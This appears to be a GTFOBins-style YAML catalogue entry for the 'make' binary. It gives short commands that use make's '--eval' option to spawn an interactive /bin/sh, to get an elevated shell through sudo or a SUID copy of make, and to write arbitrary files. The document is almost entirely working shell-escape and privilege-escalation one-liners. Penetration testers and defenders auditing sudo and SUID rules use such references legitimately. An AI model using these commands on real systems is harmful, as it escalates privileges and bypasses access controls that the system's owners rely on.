---
functions:
  execute-interactive:
    - code: |
        COMMAND='/bin/sh'
        make -s --eval=$'x:\n\t-'"$COMMAND"
  sudo-enabled:
    - code: |
        COMMAND='/bin/sh'
        sudo make -s --eval=$'x:\n\t-'"$COMMAND"
  suid-enabled:
    - code: |
        COMMAND='/bin/sh'
        ./make -s --eval=$'x:\n\t-'"$COMMAND"
  file-write:
    - code: |
        LFILE=file_to_write
        make -s --eval="\$(file >$LFILE,data)" .
---
